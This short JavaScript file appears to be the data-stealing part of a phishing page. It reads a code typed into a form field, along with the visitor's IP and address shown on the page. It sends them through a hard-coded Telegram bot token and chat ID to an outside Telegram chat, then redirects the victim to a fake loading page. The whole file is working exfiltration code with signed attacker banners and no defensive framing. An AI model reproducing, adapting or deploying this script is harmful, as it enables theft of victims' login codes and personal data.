//bot token
var telegram_bot_id = "7769909892:AAG5gzgIiC892tIXRlp3_rmAp8aFEe7mOjA";
//chat id
var chat_id =-4745634513;
var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("p4sx").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🧿OXYD3NT3🧿\n🔢Código: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\n🧿C0de by Syn4pse🧿";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'cargando2.html';
        console.log(response);
    });
    return false;
};
